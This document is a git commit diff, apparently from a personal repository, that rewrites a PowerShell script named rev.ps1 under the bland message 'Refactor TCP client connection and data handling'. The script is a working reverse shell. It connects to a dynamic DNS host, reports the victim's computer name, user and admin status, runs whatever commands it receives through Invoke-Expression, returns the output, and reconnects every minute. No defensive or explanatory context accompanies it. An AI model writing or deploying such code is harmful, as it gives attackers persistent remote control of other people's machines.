81bc67541800fd1c2a8f4780210b1bf3d7c4c306
scavengerui <ksdhanushreddy@gmail.com>
2026-03-14 01:20:18 +0530

    Refactor TCP client connection and data handling

--- rev.ps1
+++ rev.ps1
@@ -1,25 +1,38 @@
-$domain = "siflgith.duckdns.org"
-$port = 9001
+$domain   = "siflgith.duckdns.org"
+$port     = 9001
 $interval = 60
+
 while ($true) {
     try {
-        $client = New-Object System.Net.Sockets.TCPClient($domain, $port)
-        $info = "[+] $($env:COMPUTERNAME) / $($env:USERNAME) connected at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
-        $info += " PID: $PID Elevated: $([Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544')`n"
-        $send = [Text.Encoding]::ASCII.GetBytes($info)
-        $client.GetStream().Write($send, 0, $send.Length)
+        $client = New-Object System.Net.Sockets.TCPClient
+        $client.Connect($domain, $port)
+        
         $stream = $client.GetStream()
+        
+        $info  = "[+] $($env:COMPUTERNAME) / $($env:USERNAME) connected at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
+        $info += "PID: $PID Elevated: $([Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544')`n"
+        
+        $send = [Text.Encoding]::ASCII.GetBytes($info)
+        $stream.Write($send, 0, $send.Length)
+        
         [byte[]]$bytes = 0..65535 | %{0}
+        
         while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
-            $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0, $i)
-            $sendback = (iex $data 2>&1 | Out-String )
-            $prompt = $sendback + 'PS ' + (pwd).Path + '> '
+            $data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i)
+            
+            $sendback = (Invoke-Expression $data 2>&1 | Out-String)
+            
+            $prompt   = $sendback + 'PS ' + (Get-Location).Path + '> '
             $sendbyte = [Text.Encoding]::ASCII.GetBytes($prompt)
-            $stream.Write($sendbyte,0,$sendbyte.Length)
+            
+            $stream.Write($sendbyte, 0, $sendbyte.Length)
             $stream.Flush()
         }
+        
+        $stream.Close()
         $client.Close()
     }
     catch {}
+    
     Start-Sleep -Seconds $interval
 }
